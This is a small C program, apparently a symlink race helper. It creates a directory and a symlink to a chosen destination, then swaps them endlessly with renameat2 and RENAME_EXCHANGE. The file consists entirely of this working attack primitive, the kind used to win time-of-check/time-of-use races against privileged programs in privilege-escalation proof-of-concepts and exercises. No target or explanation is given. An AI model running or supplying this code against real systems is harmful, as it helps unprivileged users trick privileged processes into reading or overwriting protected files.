#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/syscall.h>

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s name1 name2 linkdest\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    char *name1 = argv[1];
    char *name2 = argv[2];
    char *linkdest = argv[3];

    int dirfd = open(".", O_DIRECTORY|O_CLOEXEC);
    if (dirfd < 0) {
        perror("Error open CWD");
        exit(EXIT_FAILURE);
    }

    if (mkdir(name1, 0755) < 0) {
        perror("mkdir failed");
        //do not exit
    }
    if (symlink(linkdest, name2) < 0) {
        perror("symlink failed");
        //do not exit
    }

    while (1)
    {
        renameat2(dirfd, name1, dirfd, name2, RENAME_EXCHANGE);
    }
}
